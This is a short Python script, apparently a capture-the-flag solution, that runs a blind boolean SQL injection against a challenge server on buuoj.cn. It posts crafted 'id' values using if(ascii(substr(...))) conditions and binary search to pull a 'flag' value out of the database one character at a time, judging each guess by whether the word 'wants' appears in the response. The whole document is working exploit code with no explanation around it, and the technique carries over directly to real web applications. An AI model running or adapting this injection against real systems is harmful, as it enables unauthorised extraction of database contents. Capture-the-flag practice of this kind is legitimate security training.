import requests


url = "http://45ef4fa4-6cab-497e-8f6e-797638049242.node5.buuoj.cn:81/index.php"

result = '' 

for pos in range(1, 50):
    h = 127
    l = 33
    m = (h + l) >> 1
    while h > l:
        payload = f"if(ascii(substr((select(flag)from(flag)),{pos},1))>{m},1,2)"
        data = {
            "id":payload
        }
        response = requests.post(url, data=data)
        if "wants" in response.text:
            l = m + 1
        else:
            h = m 
        m = (h + l) >> 1
    result += chr(m)

print(result)
